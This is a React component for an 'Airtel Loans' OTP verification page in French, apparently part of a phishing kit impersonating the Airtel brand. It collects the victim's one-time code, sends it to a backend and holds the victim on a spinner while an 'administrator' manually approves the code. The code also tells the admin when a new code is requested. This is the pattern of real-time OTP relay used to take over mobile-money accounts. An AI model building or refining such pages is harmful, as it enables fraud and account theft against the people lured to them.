import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(45);
  const [error, setError] = useState('');
  const [expired, setExpired] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [submittedOtp, setSubmittedOtp] = useState('');
  const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' | 'info' } | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  // Redirect if no phone saved
  useEffect(() => {
    if (!phoneNumber) navigate('/');
  }, [phoneNumber, navigate]);

  // Focus first box on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  // Auto-hide toast
  useEffect(() => {
    if (!toast) return;
    const t = setTimeout(() => setToast(null), 4000);
    return () => clearTimeout(t);
  }, [toast]);

  // Countdown
  useEffect(() => {
    if (timeLeft <= 0) {
      setExpired(true);
      return;
    }
    const timer = setTimeout(() => setTimeLeft((p) => p - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft]);

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const showToast = (message: string, type: 'error' | 'success' | 'info' = 'error') => {
    setToast({ message, type });
  };

  const stopPolling = () => {
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Reset everything back to input state
  const resetToInput = (message?: string) => {
    setIsVerifying(false);
    setWaitingForAdmin(false);
    setSubmittedOtp('');
    setOtp(['', '', '', '']);
    if (message) {
      setError(message);
      showToast(message, 'error');
    }
    setTimeout(() => inputRefs.current[0]?.focus(), 100);
  };

  // Poll the backend every 2 seconds for admin approval
  const startPolling = (otpJustSubmitted: string) => {
    let attempts = 0;
    const maxAttempts = 90; // 3 minutes

    pollRef.current = setInterval(async () => {
      attempts++;
      if (attempts > maxAttempts) {
        stopPolling();
        resetToInput('⏱️ Délai dépassé. Veuillez réessayer.');
        return;
      }

      try {
        const res = await fetch(
          `${import.meta.env.VITE_API_BASE_URL}/api/otp-status/${encodeURIComponent(phoneNumber)}`
        );
        const data = await res.json();

        if (data.status === 'approved') {
          stopPolling();
          showToast('✅ Prêt approuvé ! Redirection...', 'success');
          setTimeout(() => navigate('/airtel-loan-limit'), 600);
        } else if (data.status === 'rejected') {
          stopPolling();
          resetToInput('❌ Code refusé par l\'administrateur.');
        }
        // if pending → keep polling silently
      } catch {
        // network hiccup → keep polling
      }
    }, 2000);
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');

    if (expired) {
      showToast('⏱️ Le code a expiré. Cliquez sur « Renvoyer le code ».', 'error');
      return;
    }
    if (otpString.length < 4) {
      setError('Veuillez saisir le code à 4 chiffres.');
      showToast('⚠️ Veuillez saisir le code à 4 chiffres.', 'error');
      return;
    }

    setError('');
    setIsVerifying(true);
    setSubmittedOtp(otpString);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString }),
      });
      const data = await response.json();

      // ✅ Fully approved — go straight in
      if (data.status === 'success') {
        showToast('✅ Prêt approuvé ! Redirection...', 'success');
        setTimeout(() => navigate('/airtel-loan-limit'), 600);
        return;
      }

      // ⏳ Correct OTP, but admin must approve → enter waiting state
      if (data.status === 'pending') {
        setWaitingForAdmin(true);
        showToast('📤 Code envoyé à l\'administrateur. En attente...', 'info');
        startPolling(otpString);
        return;
      }

      // ❌ Admin already rejected
      if (data.status === 'rejected') {
        resetToInput('❌ Code refusé par l\'administrateur.');
        return;
      }

      // ❌ Wrong OTP
      resetToInput(data.message || 'Code invalide.');
    } catch {
      resetToInput('⚠️ Erreur de connexion. Vérifiez votre réseau.');
    }
  };

  const handleResend = async () => {
    if (isVerifying || isResending) return;

    stopPolling();
    setTimeLeft(45);
    setExpired(false);
    setOtp(['', '', '', '']);
    setError('');
    setWaitingForAdmin(false);
    setSubmittedOtp('');
    setIsResending(true);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });
      const data = await response.json();

      if (data.status === 'success') {
        showToast('📩 Nouveau code envoyé. L\'administrateur a été notifié.', 'success');
        setTimeout(() => inputRefs.current[0]?.focus(), 100);
      } else {
        showToast(data.message || 'Échec de l\'envoi.', 'error');
      }
    } catch {
      showToast('Erreur de connexion au serveur.', 'error');
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="airtel-container">
      {/* Toast */}
      {toast && (
        <div className={`airtel-toast airtel-toast-${toast.type}`}>
          <div className="airtel-toast-icon">
            {toast.type === 'error' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="8" x2="12" y2="12"></line>
                <line x1="12" y1="16" x2="12.01" y2="16"></line>
              </svg>
            )}
            {toast.type === 'success' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="16 9 10.5 15 8 12.5"></polyline>
              </svg>
            )}
            {toast.type === 'info' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="16" x2="12" y2="12"></line>
                <line x1="12" y1="8" x2="12.01" y2="8"></line>
              </svg>
            )}
          </div>
          <div className="airtel-toast-message">{toast.message}</div>
          <button className="airtel-toast-close" onClick={() => setToast(null)} aria-label="Fermer">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>
      )}

      {/* Header */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      {/* Card */}
      <div className="airtel-card">
        {isVerifying ? (
          /* ---- WAITING FOR ADMIN STATE ---- */
          <div className="airtel-verifying-state">
            <div className="airtel-big-spinner"></div>
            <h2 className="airtel-otp-heading">
              {waitingForAdmin ? 'Vérification en cours...' : 'Traitement...'}
            </h2>
            <p className="airtel-otp-subtext">
              {waitingForAdmin
                ? 'Votre code a été transmis à un administrateur pour validation. Veuillez patienter...'
                : 'Veuillez patienter un instant.'}
            </p>

            {waitingForAdmin && submittedOtp && (
              <div className="airtel-otp-sent-badge">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 2L11 13"></path>
                  <path d="M22 2l-7 20-4-9-9-4 20-7z"></path>
                </svg>
                <span>Code soumis : <strong>{submittedOtp}</strong></span>
              </div>
            )}

            <button
              type="button"
              className="airtel-resend-btn"
              style={{ marginTop: '24px' }}
              onClick={() => {
                stopPolling();
                resetToInput();
              }}
            >
              Annuler et saisir à nouveau
            </button>
          </div>
        ) : (
          /* ---- INPUT STATE ---- */
          <>
            <button className="airtel-back-link" onClick={() => navigate('/')}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
              </svg>
              Retour à la connexion
            </button>

            <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
            <p className="airtel-otp-subtext">
              Saisissez le code à 4 chiffres envoyé à{' '}
              <strong>{phoneNumber ? phoneNumber.replace(/(\+254)(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4') : 'votre téléphone'}</strong>
            </p>

            <form onSubmit={handleVerify}>
              <div className="airtel-input-group">
                <label>Saisir le code OTP</label>
                <div className="airtel-otp-container">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      type="tel"
                      maxLength={1}
                      value={digit}
                      ref={(el) => { inputRefs.current[index] = el; }}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="airtel-otp-box"
                      disabled={expired}
                    />
                  ))}
                </div>
              </div>

              {error && (
                <div className="airtel-alert" style={{ marginBottom: '20px' }}>
                  <div className="alert-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <circle cx="12" cy="12" r="10"></circle>
                      <line x1="12" y1="16" x2="12" y2="12"></line>
                      <line x1="12" y1="8" x2="12.01" y2="8"></line>
                    </svg>
                  </div>
                  <span>{error}</span>
                </div>
              )}

              <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <polyline points="12 6 12 12 16 14"></polyline>
                </svg>
                <span>{expired ? 'Code expiré' : `${timeLeft}s`}</span>
              </div>

              <button
                type="submit"
                className="airtel-verify-btn"
                disabled={expired}
                style={expired ? { opacity: 0.5, cursor: 'not-allowed' } : undefined}
              >
                Vérifier le code
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12"></line>
                  <polyline points="12 5 19 12 12 19"></polyline>
                </svg>
              </button>

              <button
                type="button"
                className="airtel-resend-btn"
                onClick={handleResend}
                disabled={isResending}
              >
                {isResending ? (
                  <span className="airtel-btn-loading">
                    <span className="airtel-spinner airtel-spinner-dark"></span>
                    Envoi en cours...
                  </span>
                ) : (
                  'Renvoyer le code'
                )}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}

export default AirtelOTPVerify;